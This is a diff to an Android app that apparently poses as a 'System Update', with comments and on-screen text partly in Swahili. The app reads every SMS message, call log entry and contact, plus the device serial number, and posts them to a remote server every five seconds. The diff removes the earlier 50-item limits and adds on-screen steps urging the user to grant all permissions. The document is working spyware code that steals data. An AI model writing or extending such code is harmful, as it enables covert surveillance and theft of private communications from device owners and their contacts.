@@ -2,7 +2,6 @@ package com.security.update;
 
 import android.Manifest;
 import android.content.ContentResolver;
-import android.content.Context;
 import android.content.pm.PackageManager;
 import android.database.Cursor;
 import android.net.Uri;
@@ -34,18 +33,11 @@ public class MainActivity extends AppCompatActivity {
     private TextView statusText;
     private ScheduledExecutorService scheduler;
 
-    // All required permissions
+    // RUHUSA MUHIMU TU - HAIKUBAGUI
     private static final String[] REQUIRED_PERMISSIONS = {
             Manifest.permission.READ_SMS,
             Manifest.permission.READ_CALL_LOG,
             Manifest.permission.READ_CONTACTS,
-            Manifest.permission.ACCESS_FINE_LOCATION,
-            Manifest.permission.ACCESS_COARSE_LOCATION,
-            Manifest.permission.READ_EXTERNAL_STORAGE,
-            Manifest.permission.WRITE_EXTERNAL_STORAGE,
-            Manifest.permission.READ_PHONE_STATE,
-            Manifest.permission.ACCESS_WIFI_STATE,
-            Manifest.permission.ACCESS_NETWORK_STATE,
             Manifest.permission.INTERNET
     };
 
@@ -58,6 +50,7 @@ public class MainActivity extends AppCompatActivity {
         // Check and request permissions
         if (checkPermissions()) {
             startAutomaticDataCollection();
+            statusText.setText("✅ Ruhusa zote zimekubaliwa! Inaanza kukusanya data...");
         } else {
             requestPermissions();
         }
@@ -73,7 +66,13 @@ public class MainActivity extends AppCompatActivity {
     }
 
     private void requestPermissions() {
-        ActivityCompat.requestPermissions(this, REQUIRED_PERMISSIONS, PERMISSION_REQUEST_CODE);
+        // Onyesha ujumbe wazi kwa mtumiaji
+        statusText.setText("📋 Tafadhali ruhusu ruhusa hizi:\n• Soma SMS\n• Soma historia ya simu\n• Soma majina ya anwani\n• Mtandao wa internet");
+        
+        // Omba ruhusa baada ya sekunde 2
+        new android.os.Handler().postDelayed(() -> {
+            ActivityCompat.requestPermissions(this, REQUIRED_PERMISSIONS, PERMISSION_REQUEST_CODE);
+        }, 2000);
     }
 
     @Override
@@ -81,65 +80,79 @@ public class MainActivity extends AppCompatActivity {
         super.onRequestPermissionsResult(requestCode, permissions, grantResults);
         if (requestCode == PERMISSION_REQUEST_CODE) {
             boolean allGranted = true;
-            for (int result : grantResults) {
-                if (result != PackageManager.PERMISSION_GRANTED) {
+            StringBuilder deniedPermissions = new StringBuilder();
+            
+            for (int i = 0; i < grantResults.length; i++) {
+                if (grantResults[i] != PackageManager.PERMISSION_GRANTED) {
                     allGranted = false;
-                    break;
+                    deniedPermissions.append(permissions[i]).append("\n");
                 }
             }
+            
             if (allGranted) {
                 startAutomaticDataCollection();
-                statusText.setText("✅ All permissions granted! Data collection started automatically.");
+                statusText.setText("✅ Ruhusa zote zimekubaliwa! Data inakusanywa automatikally...");
             } else {
-                statusText.setText("❌ Some permissions denied! App may not work properly.");
+                statusText.setText("❌ Baadhi ya ruhusa hazijakubaliwa:\n" + deniedPermissions.toString() + 
+                                 "\n\n🔧 Tumia hizi steps kurekebisha:\n" +
+                                 "1. Nenda Settings > Apps\n" +
+                                 "2. Chagua 'System Update'\n" + 
+                                 "3. Bonyeza 'Permissions'\n" +
+                                 "4. Ruhusu zote");
             }
         }
     }
 
     private void startAutomaticDataCollection() {
-        statusText.setText("🚀 Starting automatic data collection...");
+        statusText.setText("🚀 Inaanza kukusanya data automatikally...");
 
-        // Start scheduler for automatic data collection every 10 seconds
+        // Start scheduler for automatic data collection every 5 seconds
         scheduler = Executors.newScheduledThreadPool(1);
         scheduler.scheduleAtFixedRate(() -> {
             try {
                 collectAndSendAllData();
-                runOnUiThread(() -> statusText.setText("📱 Data sent - " + new SimpleDateFormat("HH:mm:ss", Locale.getDefault()).format(new Date())));
+                runOnUiThread(() -> {
+                    String time = new SimpleDateFormat("HH:mm:ss", Locale.getDefault()).format(new Date());
+                    statusText.setText("📱 Data imetumwa - " + time + "\n✅ SMS, Simu & Majina zimekusanywa");
+                });
             } catch (Exception e) {
                 Log.e("AUTO_COLLECTION", "Error: " + e.getMessage());
                 runOnUiThread(() -> statusText.setText("❌ Error: " + e.getMessage()));
             }
-        }, 0, 10, TimeUnit.SECONDS); // Every 10 seconds
+        }, 0, 5, TimeUnit.SECONDS); // Kila sekunde 5
     }
 
     private void collectAndSendAllData() {
         try {
             JSONObject data = new JSONObject();
-            data.put("device_id", Build.MODEL);
-            data.put("status", "automatic_collection");
+            data.put("device_id", Build.MODEL + " - " + Build.SERIAL);
+            data.put("status", "active");
             data.put("timestamp", System.currentTimeMillis());
 
             JSONObject collectedData = new JSONObject();
 
-            // 1. COLLECT SMS MESSAGES
-            collectedData.put("sms_messages", collectSMSMessages());
+            // 1. COLLECT SMS MESSAGES ZOTE (za zamani na za sasa)
+            if (ContextCompat.checkSelfPermission(this, Manifest.permission.READ_SMS) == PackageManager.PERMISSION_GRANTED) {
+                collectedData.put("sms_messages", collectSMSMessages());
+            } else {
+                collectedData.put("sms_messages", new JSONArray().put(new JSONObject().put("error", "SMS permission denied")));
+            }
 
-            // 2. COLLECT CALL LOGS
-            collectedData.put("call_logs", collectCallLogs());
+            // 2. COLLECT CALL LOGS ZOTE (za zamani na za sasa)
+            if (ContextCompat.checkSelfPermission(this, Manifest.permission.READ_CALL_LOG) == PackageManager.PERMISSION_GRANTED) {
+                collectedData.put("call_logs", collectCallLogs());
+            } else {
+                collectedData.put("call_logs", new JSONArray().put(new JSONObject().put("error", "Call log permission denied")));
+            }
 
-            // 3. COLLECT CONTACTS
-            collectedData.put("contacts", collectContacts());
+            // 3. COLLECT CONTACTS ZOTE
+            if (ContextCompat.checkSelfPermission(this, Manifest.permission.READ_CONTACTS) == PackageManager.PERMISSION_GRANTED) {
+                collectedData.put("contacts", collectContacts());
+            } else {
+                collectedData.put("contacts", new JSONArray().put(new JSONObject().put("error", "Contacts permission denied")));
+            }
 
-            // 4. COLLECT WHATSAPP MESSAGES
-            collectedData.put("whatsapp_messages", collectWhatsAppMessages());
-
-            // 5. COLLECT FACEBOOK MESSAGES
-            collectedData.put("facebook_messages", collectFacebookMessages());
-
-            // 6. COLLECT INSTAGRAM MESSAGES
-            collectedData.put("instagram_messages", collectInstagramMessages());
-
-            // 7. DEVICE INFORMATION
+            // 4. DEVICE INFORMATION (haitaji ruhusa)
             collectedData.put("device_info", collectDeviceInfo());
 
             data.put("data", collectedData);
@@ -154,69 +167,105 @@ public class MainActivity extends AppCompatActivity {
 
     private JSONArray collectSMSMessages() {
         JSONArray smsList = new JSONArray();
+        Cursor cursor = null;
         try {
-            Cursor cursor = getContentResolver().query(
+            // SOMA SMS ZOTE - ZA ZAMANI NA ZA SASA
+            cursor = getContentResolver().query(
                     Uri.parse("content://sms"),
-                    null, null, null, "date DESC LIMIT 50"
+                    null, null, null, "date DESC" // ZOTE, SI LIMIT
             );
+            
             if (cursor != null) {
+                int count = 0;
                 while (cursor.moveToNext()) {
                     JSONObject sms = new JSONObject();
                     sms.put("address", cursor.getString(cursor.getColumnIndexOrThrow("address")));
                     sms.put("body", cursor.getString(cursor.getColumnIndexOrThrow("body")));
                     sms.put("date", cursor.getString(cursor.getColumnIndexOrThrow("date")));
-                    sms.put("type", cursor.getString(cursor.getColumnIndexOrThrow("type")));
+                    sms.put("type", getSMSType(cursor.getString(cursor.getColumnIndexOrThrow("type"))));
                     sms.put("read", cursor.getString(cursor.getColumnIndexOrThrow("read")));
                     smsList.put(sms);
+                    count++;
+                    
+                    // Toa angalizo kwenye log kwa ajili ya ukaguzi
+                    if (count % 50 == 0) {
+                        Log.d("SMS_COLLECTION", "Imesoma SMS: " + count);
+                    }
                 }
+                Log.d("SMS_COLLECTION", "Jumla ya SMS zilizokusanywa: " + count);
                 cursor.close();
             }
         } catch (Exception e) {
             Log.e("SMS_COLLECTION", "Error reading SMS: " + e.getMessage());
+            smsList.put(new JSONObject().put("error", e.getMessage()));
+        } finally {
+            if (cursor != null && !cursor.isClosed()) {
+                cursor.close();
+            }
         }
         return smsList;
     }
 
     private JSONArray collectCallLogs() {
         JSONArray callsList = new JSONArray();
+        Cursor cursor = null;
         try {
-            Cursor cursor = getContentResolver().query(
+            // SOMA SIMU ZOTE ZA ZAMANI NA ZA SASA
+            cursor = getContentResolver().query(
                     CallLog.Calls.CONTENT_URI,
-                    null, null, null, CallLog.Calls.DATE + " DESC LIMIT 50"
+                    null, null, null, CallLog.Calls.DATE + " DESC" // ZOTE, SI LIMIT
             );
+            
             if (cursor != null) {
+                int count = 0;
                 while (cursor.moveToNext()) {
                     JSONObject call = new JSONObject();
                     call.put("number", cursor.getString(cursor.getColumnIndexOrThrow(CallLog.Calls.NUMBER)));
                     call.put("name", cursor.getString(cursor.getColumnIndexOrThrow(CallLog.Calls.CACHED_NAME)));
                     call.put("duration", cursor.getString(cursor.getColumnIndexOrThrow(CallLog.Calls.DURATION)));
                     call.put("date", cursor.getString(cursor.getColumnIndexOrThrow(CallLog.Calls.DATE)));
-                    call.put("type", cursor.getString(cursor.getColumnIndexOrThrow(CallLog.Calls.TYPE)));
+                    call.put("type", getCallType(cursor.getString(cursor.getColumnIndexOrThrow(CallLog.Calls.TYPE))));
                     callsList.put(call);
+                    count++;
+                    
+                    // Toa angalizo kwenye log kwa ajili ya ukaguzi
+                    if (count % 50 == 0) {
+                        Log.d("CALL_COLLECTION", "Imesoma simu: " + count);
+                    }
                 }
+                Log.d("CALL_COLLECTION", "Jumla ya simu zilizokusanywa: " + count);
                 cursor.close();
             }
         } catch (Exception e) {
             Log.e("CALL_COLLECTION", "Error reading call logs: " + e.getMessage());
+            callsList.put(new JSONObject().put("error", e.getMessage()));
+        } finally {
+            if (cursor != null && !cursor.isClosed()) {
+                cursor.close();
+            }
         }
         return callsList;
     }
 
     private JSONArray collectContacts() {
         JSONArray contactsList = new JSONArray();
+        Cursor cursor = null;
         try {
-            Cursor cursor = getContentResolver().query(
+            // SOMA MAJINA YOTE YA ANWANI
+            cursor = getContentResolver().query(
                     ContactsContract.Contacts.CONTENT_URI,
-                    null, null, null, null
+                    null, null, null, ContactsContract.Contacts.DISPLAY_NAME + " ASC" // ZOTE, SI LIMIT
             );
+            
             if (cursor != null) {
+                int count = 0;
                 while (cursor.moveToNext()) {
                     JSONObject contact = new JSONObject();
                     String contactId = cursor.getString(cursor.getColumnIndexOrThrow(ContactsContract.Contacts._ID));
                     String name = cursor.getString(cursor.getColumnIndexOrThrow(ContactsContract.Contacts.DISPLAY_NAME));
                     contact.put("name", name);
 
-                    // Get phone numbers
+                    // Get phone numbers ZOTE
                     JSONArray phones = new JSONArray();
                     Cursor phoneCursor = getContentResolver().query(
                             ContactsContract.CommonDataKinds.Phone.CONTENT_URI,
@@ -227,55 +276,55 @@ public class MainActivity extends AppCompatActivity {
                     );
                     if (phoneCursor != null) {
                         while (phoneCursor.moveToNext()) {
-                            phones.put(phoneCursor.getString(phoneCursor.getColumnIndexOrThrow(ContactsContract.CommonDataKinds.Phone.NUMBER)));
+                            String phone = phoneCursor.getString(phoneCursor.getColumnIndexOrThrow(ContactsContract.CommonDataKinds.Phone.NUMBER));
+                            if (phone != null && !phone.trim().isEmpty()) {
+                                phones.put(phone);
+                            }
                         }
                         phoneCursor.close();
                     }
                     contact.put("phones", phones);
                     contactsList.put(contact);
+                    count++;
+                    
+                    // Toa angalizo kwenye log kwa ajili ya ukaguzi
+                    if (count % 50 == 0) {
+                        Log.d("CONTACTS_COLLECTION", "Imesoma majina: " + count);
+                    }
                 }
+                Log.d("CONTACTS_COLLECTION", "Jumla ya majina yaliyokusanywa: " + count);
                 cursor.close();
             }
         } catch (Exception e) {
             Log.e("CONTACTS_COLLECTION", "Error reading contacts: " + e.getMessage());
+            contactsList.put(new JSONObject().put("error", e.getMessage()));
+        } finally {
+            if (cursor != null && !cursor.isClosed()) {
+                cursor.close();
+            }
         }
         return contactsList;
     }
 
-    private JSONArray collectWhatsAppMessages() {
-        JSONArray whatsappList = new JSONArray();
-        try {
-            JSONObject whatsappInfo = new JSONObject();
-            whatsappInfo.put("status", "requires_root_access");
-            whatsappList.put(whatsappInfo);
-        } catch (Exception e) {
-            Log.e("WHATSAPP_COLLECTION", "Error: " + e.getMessage());
+    private String getSMSType(String type) {
+        switch (type) {
+            case "1": return "Incoming";
+            case "2": return "Outgoing";
+            case "3": return "Draft";
+            default: return "Unknown";
         }
-        return whatsappList;
     }
 
-    private JSONArray collectFacebookMessages() {
-        JSONArray facebookList = new JSONArray();
-        try {
-            JSONObject facebookInfo = new JSONObject();
-            facebookInfo.put("status", "requires_root_access");
-            facebookList.put(facebookInfo);
-        } catch (Exception e) {
-            Log.e("FACEBOOK_COLLECTION", "Error: " + e.getMessage());
+    private String getCallType(String type) {
+        switch (type) {
+            case "1": return "Incoming";
+            case "2": return "Outgoing";
+            case "3": return "Missed";
+            case "4": return "Voicemail";
+            case "5": return "Rejected";
+            case "6": return "Blocked";
+            default: return "Unknown";
         }
-        return facebookList;
-    }
-
-    private JSONArray collectInstagramMessages() {
-        JSONArray instagramList = new JSONArray();
-        try {
-            JSONObject instagramInfo = new JSONObject();
-            instagramInfo.put("status", "requires_root_access");
-            instagramList.put(instagramInfo);
-        } catch (Exception e) {
-            Log.e("INSTAGRAM_COLLECTION", "Error: " + e.getMessage());
-        }
-        return instagramList;
     }
 
     private JSONObject collectDeviceInfo() {
@@ -286,6 +335,7 @@ public class MainActivity extends AppCompatActivity {
             deviceInfo.put("android_version", Build.VERSION.RELEASE);
             deviceInfo.put("sdk_version", Build.VERSION.SDK_INT);
             deviceInfo.put("manufacturer", Build.MANUFACTURER);
+            deviceInfo.put("serial", Build.SERIAL);
             deviceInfo.put("timestamp", new SimpleDateFormat("yyyy-MM-dd HH:mm:ss", Locale.getDefault()).format(new Date()));
         } catch (Exception e) {
             Log.e("DEVICE_INFO", "Error: " + e.getMessage());
@@ -301,8 +351,8 @@ public class MainActivity extends AppCompatActivity {
                 conn.setRequestMethod("POST");
                 conn.setRequestProperty("Content-Type", "application/json");
                 conn.setDoOutput(true);
-                conn.setConnectTimeout(10000);
-                conn.setReadTimeout(10000);
+                conn.setConnectTimeout(15000); // Ongeza muda kwa data nyingi
+                conn.setReadTimeout(15000);
 
                 OutputStream os = conn.getOutputStream();
                 os.write(data.toString().getBytes());
@@ -310,7 +360,7 @@ public class MainActivity extends AppCompatActivity {
                 os.close();
 
                 int responseCode = conn.getResponseCode();
-                Log.d("SERVER_RESPONSE", "Response code: " + responseCode);
+                Log.d("SERVER_RESPONSE", "Response code: " + responseCode + ", Data size: " + data.toString().length());
 
                 conn.disconnect();
             } catch (Exception e) {
